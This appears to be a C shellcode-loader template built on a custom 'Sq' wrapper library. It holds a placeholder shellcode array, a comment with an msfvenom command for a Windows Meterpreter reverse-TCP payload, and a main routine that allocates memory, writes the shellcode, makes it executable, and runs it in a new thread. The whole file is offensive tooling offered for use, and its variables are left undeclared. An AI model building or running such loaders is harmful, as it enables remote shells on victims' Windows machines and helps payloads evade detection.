#include "Sq.h"

unsigned char shellcode[] = {
    // define your shellcode
    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f c -b "\x00\x0a\x0d" EXITFUNC=thread 
    // or create you personall shellcode 
    0x00
};

int main() {

    Sq_AllocateMemory(baseAddress, regionSize, allocationType, protect);
    Sq_WriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode));
    Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect);
    Sq_CreateThreadEx(threadHandle, processHandle, baseAddress);
    Sq_WaitForSingleObject(threadHandle);
    Sq_Close(threadHandle);
    Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize);

    return 0;
}
